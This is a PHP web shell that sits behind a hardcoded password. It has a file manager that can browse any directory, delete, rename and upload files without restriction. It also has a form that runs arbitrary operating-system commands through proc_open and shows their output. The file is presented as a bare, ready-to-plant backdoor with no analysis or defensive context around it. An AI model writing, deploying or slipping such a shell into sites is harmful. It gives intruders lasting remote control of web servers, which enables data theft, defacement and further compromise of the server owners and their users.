<?php
session_start();
$password = 'kominfo'; // ganti password

/* ================= LOGIN ================= */
if (!isset($_SESSION['auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['pass'] ?? '') === $password) {
        $_SESSION['auth'] = true;
        header("Location: ?");
        exit;
    }
    echo '<form method="POST">
        <input type="password" name="pass" placeholder="Password">
        <button>Login</button>
    </form>';
    exit;
}

/* ================= PATH ================= */
$path = $_GET['d'] ?? getcwd();
if (!is_dir($path)) $path = getcwd();

/* ================= DELETE ================= */
if (isset($_GET['del'])) {
    $t = $_GET['del'];
    if (is_file($t)) @unlink($t);
    elseif (is_dir($t)) @rmdir($t);
    header("Location: ?d=" . urlencode($path));
    exit;
}

/* ================= RENAME ================= */
if (isset($_POST['old_name'], $_POST['new_name'])) {
    $old = $_POST['old_name'];
    $new = dirname($old) . '/' . basename($_POST['new_name']);
    if (file_exists($old)) {
        @rename($old, $new);
    }
    header("Location: ?d=" . urlencode($path));
    exit;
}

/* ================= UPLOAD ================= */
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name']);
    header("Location: ?d=" . urlencode($path));
    exit;
}

/* ================= UI ================= */
echo "<h3>File Manager: $path</h3>";

echo '<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <button>Upload</button>
</form><hr>';

echo '<ul>';
foreach (scandir($path) as $f) {
    if ($f === '.') continue;
    $fp = $path . '/' . $f;

    echo '<li>';
    if (is_dir($fp)) {
        echo "[DIR] <a href='?d=" . urlencode($fp) . "'>$f</a>";
    } else {
        echo "[FILE] <a href='$fp'>$f</a>";
    }

    echo " 
    <a href='?d=" . urlencode($path) . "&del=" . urlencode($fp) . "' onclick='return confirm(\"Delete?\")'>[x]</a>
    <a href='?d=" . urlencode($path) . "&rn=" . urlencode($fp) . "'>[rename]</a>
    </li>";
}
echo '</ul>';

/* ================= FORM RENAME ================= */
if (isset($_GET['rn'])) {
    $old = $_GET['rn'];
    $base = basename($old);
    echo "
    <hr>
    <form method='POST'>
        <b>Rename:</b><br>
        <input type='hidden' name='old_name' value='$old'>
        <input type='text' name='new_name' value='$base' required>
        <button>Rename</button>
    </form>
    ";
}
?>

<hr>
<form method="post">
    <input type="text" name="cmd" placeholder="command" required>
    <button>Execute</button>
</form>

<?php
/* ================= CMD ================= */
if (isset($_POST['cmd'])) {
    echo "<pre>";
    $cmd = $_POST['cmd'] . ' 2>&1';
    $descriptorspec = [
        0 => ["pipe", "r"],
        1 => ["pipe", "w"],
        2 => ["pipe", "w"]
    ];
    $process = proc_open($cmd, $descriptorspec, $pipes, getcwd());
    if (is_resource($process)) {
        echo htmlspecialchars(stream_get_contents($pipes[1]));
        proc_close($process);
    }
    echo "</pre>";
}
?>